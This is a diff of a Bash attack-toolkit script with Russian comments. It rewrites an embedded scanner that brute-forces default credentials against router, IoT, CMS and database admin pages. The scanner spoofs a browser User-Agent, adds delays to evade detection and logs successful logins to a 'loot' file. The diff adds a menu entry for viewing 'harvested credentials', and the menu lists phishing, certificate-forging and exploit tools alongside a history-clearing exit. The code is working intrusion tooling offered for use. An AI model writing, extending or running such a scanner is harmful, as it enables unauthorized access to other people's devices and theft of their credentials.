@@ -939,36 +939,20 @@ run_pwd_gen() {
     read
 }
 
-generate_prime_router_scan_v2() {
+generate_prime_heuristic_v3() {
     local target_file="$1"
     local code=$(cat << 'EOF'
 #!/bin/bash
-# PRIME_HEURISTIC_SCANNER (Advanced Stealth Edition)
+# PRIME_HEURISTIC_ULTIMATE_v3 (Terminal Beast)
 
 TARGET="$1"
-# Рандомизация User-Agent для обхода простых WAF/IPS
-UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
 echo "--------------------------------------------------"
-echo -e "\e[1;32m>> INITIATING HEURISTIC ANALYSIS: $TARGET\e[0m"
+echo -e "\e[1;35m>> STARTING ULTIMATE HEURISTIC SCAN: $TARGET\e[0m"
 echo "--------------------------------------------------"
 
-# Эвристическая функция проверки доступа
-check_access() {
-    local user=$1
-    local pass=$2
-    local url=$3
-    # Используем -L для редиректов и -sS для тишины
-    local res=$(curl -sL -u "$user:$pass" -A "$UA" --max-time 3 -o /dev/null -w "%{http_code}" "$url")
-    
-    if [[ "$res" == "200" ]]; then
-        echo -e "    \e[1;32m[!] SUCCESS: $user:$pass\e[0m (Found on $url)"
-        return 0
-    fi
-    return 1
-}
-
-# Список критических путей (от роутеров до админок сайтов и DB-веб-интерфейсов)
+# Массивы подгружаем прямо здесь
 # Тотальный список путей (Router, IoT, CMS, DB, Backups)
 PATHS=(
   "/" "/admin" "/login" "/panel"          # Базовые
@@ -985,8 +969,6 @@ PATHS=(
   "/cgi-bin/config.exp"                   # DrayTek & others
 )
 
-
-# Минимальный набор самых эффективных пар (Эвристический топ)
 # Эвристический топ-20 (на базе статистики реальных взломов)
 CREDS=(
   "admin:admin" "admin:password" "admin:"     # Классика
@@ -1002,19 +984,34 @@ CREDS=(
   "pi:raspberry"                              # Raspberry Pi & IoT
 )
 
-for path in "${PATHS[@]}"; do
-    URL="http://$TARGET$path"
-    # Быстрая проверка существования пути
-    if [[ $(curl -s -o /dev/null -w "%{http_code}" -A "$UA" --max-time 2 "$URL") != "404" ]]; then
-        echo -e "\e[1;34m[*] Testing entry point: $path\e[0m"
-        for pair in "${CREDS[@]}"; do
-            IFS=':' read -r u p <<< "$pair"
-            check_access "$u" "$p" "$URL" && break 2 # Если нашли, выходим из циклов для этой цели
-            sleep 0.2 # Задержка для скрытности (Stealth)
-        done
-    fi
-done
 
+for path in "${PATHS[@]}"; do
+    # Пытаемся определить, живет ли там HTTP или HTTPS
+    for proto in "http" "https"; do
+        URL="${proto}://${TARGET}${path}"
+        
+        # Предварительный замер: жива ли цель?
+        RESPONSE=$(curl -sL -I -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null)
+        CODE=$(echo "$RESPONSE" | grep "HTTP/" | awk '{print $2}' | tail -n1)
+        SERVER=$(echo "$RESPONSE" | grep -i "Server:" | awk '{print $2}' | tr -d '\r')
+
+        if [[ "$CODE" == "200" || "$CODE" == "401" ]]; then
+            echo -e "\e[1;34m[*] TARGET DETECTED:\e[0m $path (Server: ${SERVER:-Unknown})"
+            
+            # Если 401 — значит точно нужна авторизация, бьем!
+            for pair in "${CREDS[@]}"; do
+                IFS=':' read -r u p <<< "$pair"
+                RES=$(curl -sL -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
+                
+                if [[ "$RES" == "200" ]]; then
+                    echo -e "    \e[1;32m[!!!] VULNERABLE FOUND: $u:$p\e[0m @ $URL"
+                    echo "$u:$p@$TARGET$path" >> /root/prime_found_keys.txt
+                    break 2
+                fi
+            done
+        fi
+    done
+done
 echo "--------------------------------------------------"
 EOF
 )
@@ -1042,6 +1039,21 @@ run_heuristic_router_scan() {
         prime-hscan "$H_TARGET"
     fi
     
+    echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
+    read
+}
+
+run_view_loot() {
+    clear
+    echo -e "\e[1;32m[ PRIME DATA HARVESTER - LOOT VIEW ]\e[0m"
+    echo "--------------------------------------------------"
+    if [[ -f "/root/prime_found_keys.txt" ]]; then
+        echo -e "\e[1;34mFOUND CREDENTIALS:\e[0m"
+        cat /root/prime_found_keys.txt
+    else
+        echo "No harvested credentials yet."
+    fi
+    echo "--------------------------------------------------"
     echo -e "\n\e[1;33mPRESS ENTER TO RETURN...\e[0m"
     read
 }
@@ -1096,10 +1108,10 @@ exit_script() { history -c; exit 0; }
 # --- ГЛАВНОЕ МЕНЮ (v31.3: + SEC_TOOLS) ---
 run_main_menu() {
     # 1. Список имен
-    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR UPDATE_CORE SERVICE_HUB PWD_GEN CERT_FORGE SYSTEM_INFO CERTIF_READER HEURESTIC_ROUTER_SCAN EXIT"
+    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL REPAIR UPDATE_CORE SERVICE_HUB PWD_GEN CERT_FORGE SYSTEM_INFO CERTIF_READER HEURESTIC_ROUTER_SCAN VIEW_LOOT EXIT"
     
     # 2. Список функций
-    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair update_prime run_servers run_pwd_gen run_cert_forge run_system_info run_cert_reader run_heuristic_router_scan exit_script"
+    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools run_repair update_prime run_servers run_pwd_gen run_cert_forge run_system_info run_cert_reader run_heuristic_router_scan run_view_loot exit_script"
     
     prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
 }
